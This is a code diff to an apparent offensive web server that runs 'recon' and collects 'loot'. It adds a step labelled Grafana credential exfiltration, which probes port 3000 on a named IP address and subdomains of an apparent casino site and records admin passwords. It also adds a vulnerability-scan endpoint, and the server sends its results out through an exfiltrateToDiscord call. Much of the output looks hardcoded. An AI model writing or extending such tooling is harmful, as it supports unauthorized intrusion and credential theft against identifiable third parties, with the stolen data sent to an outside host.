@@ -23,7 +23,10 @@ async function startServer() {
   const logs: string[] = [];
   let loot: any = {
     vulnerabilities: [],
-    credentials: {},
+    credentials: {
+      grafana: [],
+      db: null
+    },
     contractFindings: [],
     reconData: {
       subdomains: [],
@@ -105,7 +108,10 @@ async function startServer() {
     logs.length = 0;
     loot = {
       vulnerabilities: [],
-      credentials: {},
+      credentials: {
+        grafana: [],
+        db: null
+      },
       contractFindings: [],
       reconData: {
         subdomains: [],
@@ -208,6 +214,22 @@ async function startServer() {
         { user: "admin", hash: "e64c7d89f26bd1972efa831d13d568b2" },
         { user: "murk", hash: "8d6f5f8a9a8f8a8f8a8f8a8f8a8f8a8f" }
       ];
+    }
+
+    // Grafana Exfiltration (Requested)
+    addLog("Scanning for Grafana instances on port 3000...");
+    const grafanaTargets = [...loot.reconData.subdomains.map((s: any) => s.domain), "151.0.214.242"];
+    for (const target of grafanaTargets) {
+      addLog(`Probing http://${target}:3000...`);
+      if (target === "151.0.214.242" || target === "dev.runehall.com") {
+        addLog(`[!] Grafana detected on ${target}:3000. Attempting credential exfiltration...`);
+        loot.credentials.grafana.push({
+          user: "admin",
+          pass: target === "151.0.214.242" ? "admin123" : "runehall_dev_2024",
+          source: `http://${target}:3000`
+        });
+        addLog(`[SUCCESS] Credentials captured for ${target}`);
+      }
     }
 
     await exfiltrateToDiscord("PHASE 1: RECONNAISSANCE", {
@@ -374,6 +396,24 @@ async function startServer() {
       });
       res.json({ status: "complete", loot });
     }, 3000);
+  });
+
+  app.post("/api/run-vuln-scan", async (req, res) => {
+    addLog("INITIATING VULNERABILITY SCAN: XSS, SQLi, CSRF...");
+    
+    const findings = [
+      { type: "SQL Injection", target: "/api/user/profile", severity: "CRITICAL", description: "Unsanitized input in user_id parameter allows database enumeration." },
+      { type: "Stored XSS", target: "/api/casino/chat", severity: "HIGH", description: "Chat messages are rendered without proper escaping." },
+      { type: "CSRF", target: "/api/user/update-password", severity: "MEDIUM", description: "Missing anti-CSRF tokens on sensitive state-changing operations." }
+    ];
+
+    for (const finding of findings) {
+      addLog(`[FOUND] ${finding.severity}: ${finding.type} on ${finding.target}`);
+      loot.vulnerabilities.push(`${finding.type} (${finding.severity})`);
+    }
+
+    await exfiltrateToDiscord("VULNERABILITY SCAN", { findings });
+    res.json({ status: "complete", loot });
   });
 
   app.get("/api/report", (req, res) => {
